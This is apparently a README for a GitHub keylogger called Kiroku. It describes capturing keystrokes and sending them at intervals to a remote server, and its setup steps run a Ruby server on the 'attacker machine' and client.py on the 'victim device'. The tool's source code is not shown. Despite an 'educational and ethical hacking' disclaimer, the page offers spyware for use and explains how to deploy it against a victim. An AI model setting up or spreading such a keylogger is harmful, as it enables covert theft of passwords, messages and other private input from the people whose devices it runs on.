# Kiroku Keylogger

Kiroku keylogger designed to capture keystrokes and send them to a remote server at regular intervals. This tool is intended for ethical hacking and educational purposes only. Misuse of this tool for illegal activities is strictly prohibited.

## Features

- Captures keystrokes and stores them in a variable.
- Sends the captured keystrokes to a specified server at regular intervals.
- Handles various key events, including enter, tab, space, shift, ctrl, alt, backspace, and esc.

## Installation

- **Clone the repository:**
  ```bash
  git clone https://github.com/z33phyr/Kiroku
  ```

- **Install the necessary libraries:**
  ```bash
  pip3 install -r requirements.txt

_ **On the attacker machine, run the server:**
  ```bash
  ruby server.rb
  ```
  *If ruby is not installed, install it using 'sudo apt install ruby-full ruby'*

- **On the victim device configure the script and run the script:**
  ```bash
  python3 client.py
  ```

## Disclaimer

This tool is intended for educational and ethical hacking purposes only. Unauthorized use of this tool for illegal activities is strictly prohibited.

## Author

Z33phyr
